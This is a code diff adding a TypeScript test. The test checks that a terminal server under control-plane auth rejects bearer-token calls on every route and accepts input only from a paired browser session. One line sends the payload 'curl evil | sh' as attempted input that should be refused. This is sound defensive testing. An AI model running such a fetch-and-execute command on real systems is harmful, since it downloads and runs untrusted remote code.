@@ -138,6 +138,49 @@ class TerminalSse {
   }
 }
 
+describe('terminals under control-plane auth', () => {
+  it('serve only the paired browser: a bearer token gets 401 on every route', async () => {
+    const baseUrl = await start({ controlPlaneAuth: true })
+    const live = server!
+    const paired = await fetch(`${baseUrl}/api/auth/pair`, {
+      method: 'POST',
+      headers: { 'content-type': 'application/json', origin: live.auth.canonicalOrigin },
+      body: JSON.stringify({ code: live.auth.issuePairingCode().code }),
+    })
+    const browser = {
+      cookie: (paired.headers.get('set-cookie') ?? '').split(';')[0] ?? '',
+      origin: live.auth.canonicalOrigin,
+      'x-dnt-harness-csrf': ((await paired.json()) as { csrf: string }).csrf,
+    }
+    const bearer = { authorization: `Bearer ${live.auth.issueBearer(['sessions']).token}` }
+    const call = (method: string, url: string, headers: Record<string, string>, body?: unknown) =>
+      fetch(`${baseUrl}${url}`, {
+        method,
+        headers: { ...(body !== undefined ? { 'content-type': 'application/json' } : {}), ...headers },
+        ...(body !== undefined ? { body: JSON.stringify(body) } : {}),
+      })
+    const wid = ((await (await call('GET', '/api/workspaces', bearer)).json()) as Array<{ id: string }>)[0]!.id
+    const base = `/api/workspaces/${wid}/terminals`
+
+    expect((await call('GET', base, bearer)).status).toBe(401)
+    expect((await call('POST', base, bearer, {})).status).toBe(401)
+    expect(spawned).toEqual([])
+
+    const created = await call('POST', base, browser, {})
+    expect(created.status).toBe(201)
+    const id = ((await created.json()) as { id: string }).id
+    expect((await call('GET', `${base}/events`, bearer)).status).toBe(401)
+    expect((await call('POST', `${base}/${id}/input`, bearer, { data: b64('curl evil | sh\r') })).status).toBe(401)
+    expect((await call('POST', `${base}/${id}/resize`, bearer, { cols: 90, rows: 20 })).status).toBe(401)
+    expect((await call('DELETE', `${base}/${id}`, bearer)).status).toBe(401)
+    expect(spawned[0]?.writes).toEqual([])
+    expect(spawned[0]?.killed).toBe(false)
+
+    expect((await call('POST', `${base}/${id}/input`, browser, { data: b64('ls\r') })).status).toBe(202)
+    expect(spawned[0]?.writes).toEqual(['ls\r'])
+  })
+})
+
 describe('terminal HTTP surface', () => {
   it('opens an unbound terminal at an absolute path even from a relative root', async () => {
     const baseUrl = await start({ terminals: { defaultCwd: '.' } })
